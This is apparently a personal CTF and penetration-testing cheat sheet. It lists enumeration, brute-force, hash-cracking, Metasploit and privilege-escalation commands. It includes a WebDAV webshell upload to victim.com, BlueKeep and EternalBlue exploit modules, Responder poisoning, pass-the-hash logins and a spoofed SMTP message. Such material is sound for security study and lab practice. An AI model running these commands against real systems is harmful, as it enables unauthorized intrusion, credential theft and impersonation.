

## Web App Exploitation
This probably has a custom developed web application which include some web security flaw which must be identified and exploited. The question is: Which security flaw?



### Directory Enumeration

Mandatory checks for `robots.txt` and `security.txt`.
```
curl http://$TG/robots.txt
curl http://$TG/.well-known/security.txt
curl http://$TG/sitemap.xml
curl http://$TG/sitemaps.xml
```

```
dirb $TG # Uses default wordlist
gobuster dir -u $TG -w /usr/share/wordlists/wfuzz/general/common.txt
```

With Extensions
```
dirb $TG -X .bak,.tar.gz,.zip,.sql,.bak.zip
gobuster dir -u $TG -x html,php,js -w /usr/share/wordlists/wfuzz/general/common.txt
```

#### Fuzzzzzzzz
```
ffuf -w /usr/share/wordlists/wfuzz/general/common.txt -u http://$TG/FUZZ
```

### XSS vulnerabilities
Start with common XSS Payloads

### SQL injection
Start with common SQLi Payloads

### Command injection
Some PHP scripts allow command injection like `index.php?cmd=<COMMAND>`.

### Server Enumeration
Usually, we don't have to do this. But, hey! If everything else fails, why not :smirk:


## Cryptography
This often features ciphertexts, cryptographic algorithms (AES, RSA), or cryptographic systems (Diffie-Hellman) which involve several encryption and decryption protocols used to uncover hidden messages or vulnerabilities.

Use [FactoDB](https://factordb.com/) and [Alpertron](https://www.alpertron.com.ar/ECM.HTM) for big integer factorization.

## Steganography

`zsteg`, `stegcracker`

```
steghide extract -sf <filename>
```

```
binwalk <FILENAME>
binwalk -e <FILENAME>  # to extract
binwalk -dd ".*" <FILENAME>  # to force-extract
```


## Binary exploitation
This category often features compiled programs which have a vulnerability allowing a competitor to gain a command shell on the server running the vulnerable program. This often has the user exercising reverse engineering skills as well.

```
xxd <FILENAME>
hexdump <FILENAME>
hexeditor <FILENAME>
```


### Buffer Overflow
Exploiting a buffer overflow (which sometimes has some security mitigations in place) to gain a command shell and read a file.

### Format String
Exploiting a format string vulnerability to gain a command shell and read a file.

## Reverse Engineering
This category often features programs from all operating systems which must be reverse engineered to determine how the program operates. Typically the goal is to get the application to reach a certain point or perform some action in order to achieve a solution.

Ofcouse you can try `IDA Pro` or `Ghidra`. But you can also start with `strings`! :heart_eyes:

[Dogbolt](https://dogbolt.org/) is an online decompiler for files < 2MB. The opposite can be done with [Godbolt](https://godbolt.org/)

### ELF Reversing
### EXE Reversing

### Android APK Reversing

`gplaycli` for installing apks from Google PlayStore. (4+ yrs Old)

[APKiD](https://github.com/rednaga/APKiD) gives you information about how an APK was made. It identifies many compilers, packers, obfuscators, and other
weird stuff.

`apktool`

[bytecode-viewer](https://github.com/Konloch/bytecode-viewer) : Android APK Reverse Engineering Suite

## Programming/Coding
Showcase your supreme coding skills to solve challenges. The problem here will be either time-complexity, space-complexity or both. :sob:

## Forensics
This category often features memory dumps, hidden files, or encrypted data which must be analyzed for information about underlying information.

Start with identifying which file it is. [File signature](https://en.wikipedia.org/wiki/List_of_file_signatures) 101!
```
file <FILENAME> 
```

For memory dumps:
Also check [this](https://noob-atbash.github.io/CTF-writeups/fword-20/forensic/memory) out for a refresher.
```
volatility -f <FILE>  --imageinfo
```

Converting ASCII hexdump output into binary files
```
xxd -r <ASCII-HEXDUMP> <OUTPUT-FILE>
```
Use 'exiftool' to extract EXIF information.

## Networking
This mostly features packet captures (PCAPs) which must be analyzed for information about an underlying surface.
Wireshark FTW!

## OSINT

```
host $TG
whois $TG
whatweb $TG
dnsrecon -d $TG
wafw00f $TG --findall
```

Passive Subdomain enumeration and email (and other info) gathering.
```
sublist3r -d $TG -e google,yahoo
theHarvester -d $TG -b google,linkedin
```


##### DNS Zone Transfer
You do DNS zone transfer on publically accessible DNS servers which could possibly have internal domain/sub-domain DNS records.

Step 1:  Get all DNS name servers of the target domain

```dig ns <target domain>```

Step 2: Check if NS allows zone transfers

```dig axfr @<domain of name server> <target domain>```

*OR*

Use: `dnsenum <target domain>` for automated Zone Transfer

*OR*

Use: `fierce -dns <target domain>` for automated Zone Transfer


## Blockchain


## Miscellaneous
Recursively search the current directory (`.`) and all the files inside for the string "flag".
```
grep -Rnw . -e 'flag'
```

```
find / -name "name_of_file" -type f 2>/dev/null
```

Set Target
```
TG=192.168.XXX.XXX
```

Use [Responder](https://github.com/lgandx/Responder) tool which has built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication. Great tool if you need a quick server to catch such connections and even poison them.

```
responder -I <INTERFACE>
```


## 1. Information Gathering and Reconnaissance

[DNS lookup](https://dnschecker.org/all-dns-records-of-domain.php) | [Abuse IPDB](https://www.abuseipdb.com/) | [Shodan](https://www.shodan.io/) | 
[WayBackMachine](https://archive.org/web/) | [VirusTotal](https://www.virustotal.com/gui/home/search) | [App.Any.Run](https://app.any.run/) | [DNSDumpster](https://dnsdumpster.com/)


## 2. Scanning and Enumeration

#### Nmap

Host Discovery

 -sn (No port scan) : This option tells Nmap not to do a port scan after host discovery, and only print out the available hosts that responded to the host discovery probes. This is often known as a “ping scan” or a "ping sweep", and is more reliable than pinging the broadcast address because many hosts do not reply to broadcast queries.

The default host discovery done with -sn consists of an ICMP echo request, TCP SYN to port 443, TCP ACK to port 80, and an ICMP timestamp request by default. When executed by an unprivileged user, only SYN packets are sent (using a connect call) to ports 80 and 443 on the target. When a privileged user tries to scan targets on a local ethernet network, ARP requests are used unless --send-ip was specified. The -sn option can be combined with any of the discovery probe types (the -P* options) for greater flexibility. If any of those probe type and port number options are used, the default probes are overridden. When strict firewalls           are in place between the source host running Nmap and the target network, using those advanced techniques is recommended. Otherwise hosts could be missed when the firewall drops probes or their responses.


```
sudo nmap -sn <target>

# TCP SYN Ping Scan
nmap -sn -PS <target>

# TCP ACK Ping Scan
nmap -sn -PA <target>

# ARP Ping Scan
nmap -sn -PR <target>

# UDP Ping Scan
nmap -sn -PU <target>

# ICMP Echo Ping Scan:
nmap -sn -PE <target>
```


Port Scanning
```
sudo nmap -sS $TG -vvv -oN Nmap_init.txt
sudo nmap -sS -A $TG -vvv -oN Nmap_init.txt
```


### FTP (Port 20/21)
Check for `anonymous` login.
```
ftp $TG
```
Note: You can use commands like `ls`, `pwd`, `cd` and `get`.

Maybe checkout other variants of FTP like `lftp`.

### SSH (Port 22)
```
ssh <USERNAME>@$TG
```

Got ssh username, but has no password? Try bruteforcing with [Hydra](#bruteforcing-with-hydra)

Got ssh keys (at `~.ssh/id_rsa`)? Try this; 
```
chmod 600 id_rsa
ssh -i id_rsa <USERNAME>@$TG
```

You can also try cracking SSH PRIVATE keys using `john`;
```
ssh2john id_rsa > id_rsa.john
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.john
```

**SCP** <br>
Copy from remote to local;
```
scp -r <USERNAME>@$TG:/remote/path/to/foo /local/bar/
```

Copy from local to remote;
```
scp /local/bar/file USER@REMOTE_IP:/remote/path/to/foo
```

**SSH Tunneling**

Syntax: `ssh -L <LOCAL_PORT>:<TG_IP>:<TG_PORT> <USER>@<SSH_IP>`

```
ssh -L 2222:172.17.0.2:8080 <USERNMAE>@$TG
```

### Telnet (Port 23)

```
telnet $TG
```


### SMTP (Port 25)

```
nc $TG 25
telnet $TG 25
```

```
EHLO example.com
```
ESMTP servers usually responds to `EHLO`. Always prefer `EHLO` if the server supports it — it gives you much more info.
If the server doesn't recognize `EHLO`, fall back to `HELO` (very rare these days).

Verifying user
```
VRFY admin
> 252 2.0.0 admin
```

Sending message
```
MAIL FROM:<test@hacker.com>
RCPT TO:<admin@openmailbox.xyz>
DATA
Subject: test

This is a test message.
.
QUIT
```
OR
```
sendemail -f admin@attacker.xyz -t root@openmailbox.xyz -s $TG -u "Subject:IMP" -m "Hi root, a fake from admin" -o tls=no
```

Enumerating SMTP users
```
smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t $TG
msf6> use auxiliary/scanner/smtp/smtp_enum
```


### HTTP (Port 80)
Refer Web app exploitation



##### WebDAV Exploitation

Step 1: Find the WebDAV endpoint. It would be something like `/webdav/` and you would need a username and password to log in.
```
sudo nmap -script=http-enum $TG -vvv
```

Step 2: Find the username and password using `hydra`.

Step 3: `DAVtest` will help you check if you can 
- Create a directory on the server
- PUT files on the server
- Execute files on the server (webshell attack path)

```
davtest -auth <USERNAME>:<PASSWORD> -url http://victim.com/webdav 
```

Step 4: Run `cadaver` on the server to get a CLI on it.
```
cadaver http://example.com/webdav      # This will prompt you for USERNAME and PASSWORD
dav:/webdav/> ?   # for help

dav:/webdav/> put /usr/share/webshells/asp/webshell.asp 
Uploading /usr/share/webshells/asp/webshell.asp to `/webdav/webshell.asp':
Progress: [=============================>] 100.0% of 1362 bytes succeeded.
```

Step 5: Enjoy your sweet shell @ http://victim.com/webdav/webshell.asp



### Kerberos (Port 88)
Kerberos is a key authentication service within Active Directory. 


**Kerbrute**
```
/opt/kerbrute/kerbrute --dc $TG -d $TG userenum /path/to/wordlist.lst
```


### SMB (Ports 139/445)

Check for **EternalBlue**

`139/tcp open  netbios-ssn` (ms17-010) [CVE-2017-0143]

> A critical remote code execution vulnerability exists in Microsoft SMBv1


Look for ports 137, 138.
```
nmap -sU --top-ports 25 $TG 
```


```
enum4linux $TG
```

Use `rpcclient` to determine whether anonymous connection (null session) is allowed on the samba server or not.
```
rpcclient -U "" -N demo.ine.local
enumdomusers
queryuser <RID>

enumdomgroups
getdompwinfo
getdominfo
```

Syntax: `smbclient -L //server/[service] -U <USERNAME>`
Syntax: `smbclient -L -N //server/[service] -U <USERNAME>` for no password.


```
smbclient -L //$TG/ -U '<USERNAME>'
smbclient -L //$TG/<SHARE> -U '<USERNAME>'
smbclient -I //$TG/ -U '<USERNAME>' -P '<PASSWORD>'  
```


```
evil-winrm  -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'
```


```
evil-winrm -i 10.10.196.249 -u Administrator -H '0e0363213e37b94221497260b0bcb4fc'
```


```
nmap -p445 --script smb-protocols $TG
nmap -p445 --script smb-os-discovery.nse $TG
nmap -p445 --script smb-security-mode $TG
nmap -p445 --script smb-enum-sessions $TG
nmap -p445 --script smb-enum-shares   $TG

nmap -p445 --script smb-server-stats --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local

nmap -p445 --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
nmap -p445 --script smb-enum-shares   --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
nmap -p445 --script smb-enum-users    --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
nmap -p445 --script smb-enum-domains  --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
nmap -p445 --script smb-enum-groups   --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
nmap -p445 --script smb-enum-services --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local

# Enumerating folders
nmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```


[About IPC$ share](https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/inter-process-communication-share-null-session)
The `IPC$` share is also known as a null session connection. By using this session, Windows lets anonymous users perform certain activities, such as enumerating the names of domain accounts and network shares.



### HTTPS (Port 443)

Must check the SSL certificate and look into sections like the `Subject Alt Names`.


### MySQL (Port 3306)

 - auxiliary/scanner/mysql/mysql_version
 - auxiliary/scanner/mysql/mysql_login (bruteforce)
 - auxiliary/admin/mysql/mysql_enum (supports authenticated enumeration)
 - auxiliary/admin/mysql/mysql_sql (to run custom sql query)
 - auxiliary/scanner/mysql/mysql_file_enum
 - auxiliary/scanner/mysql/mysql_hashdump
 - auxiliary/scanner/mysql/mysql_schemadump
 - auxiliary/scanner/mysql/mysql_writable_dirs


### RDP (Port 3389)

BlueKeep RCE [CVE-2019-0708]
```
msf > use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```




#### Bruteforcing with Hydra

**HTTP Forms**
```
hydra -l <USERNAME> -P /usr/share/wordlists/rockyou.txt $TG http-post-form "/path/to/login:ed=^USER^&pw=^PASS^:F=incorrect" -t 10
```

**SSH**
```
hydra -l <USERNAME> -P /usr/share/wordlists/rockyou.txt $TG ssh -t 10
```


#### Password cracking

Step 1: Try [CrackStation](https://crackstation.net/) first! Then we can look into others;


**Hash type identification**: `hashid`, `hash-identifier` or we can use [Hash Analyzer](https://www.tunnelsup.com/hash-analyzer/).

To list the hash formats supported by John
```
john --list:formats 
```

To crack simple hashes;
```
john input_file --wordlist=/usr/share/wordlists/rockyou.txt --format=<HASH-FORMAT>
```


Find the hash [`MODE`](https://hashcat.net/wiki/doku.php?id=example_hashes) here!
```
hashcat -a 0 -m MODE input_file /usr/share/wordlists/rockyou.txt -O
```

For salted hash, `hashcat` expects the input file to be in the format `<hash>:<salt>`.



## 3. Exploitation

[ExploitDB](https://www.exploit-db.com/)

`msfconsole` is your friend here :smile:


Databases & Workspaces
```
db_status   # Making sure Postgresql DB is good and connected.
workspace -a <NEW_WORKSPACE_NAME>    # --add a new workspace
db_stats
```

Nmap inside Metasploit
```
db_import <NMAP-oX.xml>       # To import nmap scan results
db_nmap -sS -sV -O <TARGET>   # To run nmap inside msfconsole
```

Host commands
```
hosts
services
vulns
loot
creds
```

Setting RHOSTS
```
hosts -R  
setg RHOSTS <TARGET_IP>  # to set a global variable
```

Routing inside Meterpreter
```
meterpreter > run autoroute -s 192.64.132.2

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
```



Once you got shell using metasploit, try [upgrading the shell](https://infosecwriteups.com/metasploit-upgrade-normal-shell-to-meterpreter-shell-2f09be895646).
Background the current shell by typing **Ctrl + z**. Then;
```
use post/multi/manage/shell_to_meterpreter
```
Set the required variables and hit `run`!

`portfwd` command in meterpreter can be used to forward a local port to a remote service.

Syntax: `portfwd add –l <LOCAL-PORT> –p <REMOTE-PORT> –r <TARGET-HOST>`
```
portfwd add –l 3389 –p 3389 –r 172.16.194.191
portfwd delete –l 3389 –p 3389 –r 172.16.194.191
```


#### Shell Stabilization

`python -c 'import pty; pty.spawn("/bin/bash")'` <br>
`export TERM=xterm` <br>
[Optional] Hit **Ctrl + Z** and run `raw -echo; fg` <br>


#### Got Shell? IG again!
`whoami` && `id` && `sudo -l` && `cat /etc/*release` && `uname -a`


## 4. Privilege Escalation

Find **SUID** files! [GTFOBins](https://gtfobins.github.io/)
```
find / -perm -u=s -type f 2>/dev/null
```
```
sudo -l
```
```
cat /etc/sudoers
```


#### Very Handy Links ;)

- Have a Domain Name? Do a [DNS lookup](https://dnschecker.org/all-dns-records-of-domain.php)!
- [PHP] pentestmonkey/[php-reverse-shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)
- Reverse Shell Generator [here](https://www.revshells.com/) FTW!
- [CyberChef](https://gchq.github.io/CyberChef/)
- Have non-salted hashes? Give [CrackStation](https://crackstation.net/) a try!
- Free [WebHooks](https://webhook.site/ ) for all!



---

[Markdown Cheatsheet](https://www.markdownguide.org/cheat-sheet/) | [Markdown Emojis](https://gist.github.com/rxaviers/7360908)
